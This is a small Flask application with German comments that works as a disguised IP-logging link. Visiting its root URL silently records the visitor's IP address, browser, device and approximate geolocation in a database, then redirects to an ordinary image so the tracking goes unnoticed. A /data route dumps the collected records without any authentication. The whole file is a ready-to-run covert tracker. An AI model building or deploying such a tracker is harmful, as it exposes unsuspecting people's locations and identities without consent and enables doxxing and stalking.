from flask import Flask, request, jsonify, redirect, send_file
import sqlite3
import requests
from datetime import datetime
import os

app = Flask(__name__)

# --- Datenbank initialisieren ---
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip_address TEXT,
            user_agent TEXT,
            platform TEXT,
            browser TEXT,
            device_type TEXT,
            city TEXT,
            region TEXT,
            country TEXT,
            latitude REAL,
            longitude REAL,
            timestamp TEXT
        )
    ''')
    conn.commit()
    conn.close()

# --- IP-Geolocation ---
def get_ip_geolocation(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon', timeout=5)
        data = response.json()
        if data.get('status') == 'success':
            return {
                'city': data.get('city', ''),
                'region': data.get('regionName', ''),
                'country': data.get('country', ''),
                'latitude': data.get('lat', 0.0),
                'longitude': data.get('lon', 0.0)
            }
    except:
        pass
    return {'city': '', 'region': '', 'country': '', 'latitude': 0.0, 'longitude': 0.0}

# --- User-Agent parsen ---
def parse_user_agent(user_agent):
    ua = user_agent.lower()
    platform = 'Unknown'
    if 'windows' in ua: platform = 'Windows'
    elif 'macintosh' in ua or 'mac os' in ua: platform = 'macOS'
    elif 'linux' in ua: platform = 'Linux'
    elif 'android' in ua: platform = 'Android'
    elif 'iphone' in ua or 'ipad' in ua: platform = 'iOS'
    
    browser = 'Unknown'
    if 'edg' in ua: browser = 'Edge'
    elif 'opr' in ua or 'opera' in ua: browser = 'Opera'
    elif 'chrome' in ua and 'android' not in ua: browser = 'Chrome'
    elif 'safari' in ua and 'chrome' not in ua: browser = 'Safari'
    elif 'firefox' in ua: browser = 'Firefox'
    
    device_type = 'Desktop'
    if 'mobile' in ua or 'android' in ua: device_type = 'Mobile'
    elif 'tablet' in ua or 'ipad' in ua: device_type = 'Tablet'
    
    return platform, browser, device_type

# --- HAUPTROUTE: Trackt und leitet zum Bild weiter ---
@app.route('/')
def track_and_redirect():
    # 1. IP-Adresse ermitteln
    ip = request.remote_addr
    
    # Bei Proxy: X-Forwarded-For verwenden
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    
    # 2. Geolocation
    geo = get_ip_geolocation(ip)
    
    # 3. User-Agent parsen
    user_agent = request.headers.get('User-Agent', '')
    platform, browser, device_type = parse_user_agent(user_agent)
    
    # 4. In Datenbank speichern
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO clicks (
            ip_address, user_agent, platform, browser, device_type,
            city, region, country, latitude, longitude, timestamp
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        ip, user_agent, platform, browser, device_type,
        geo['city'], geo['region'], geo['country'],
        geo['latitude'], geo['longitude'],
        datetime.now().isoformat()
    ))
    conn.commit()
    conn.close()
    
    # 5. WEITERLEITUNG ZUM BILD
    # Dein Bild-URL:
    return redirect('https://i.postimg.cc/9MWQhv5r/ograda.jpg', 302)

# --- Daten anzeigen (für Admin) ---
@app.route('/data')
def view_data():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('SELECT * FROM clicks ORDER BY id DESC LIMIT 100')
    rows = c.fetchall()
    conn.close()
    
    # Spaltennamen für bessere Lesbarkeit
    columns = ['id', 'ip_address', 'user_agent', 'platform', 'browser', 
              'device_type', 'city', 'region', 'country', 'latitude', 
              'longitude', 'timestamp']
    
    result = []
    for row in rows:
        result.append(dict(zip(columns, row)))
    
    return jsonify(result)

# --- Start ---
if __name__ == '__main__':
    init_db()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)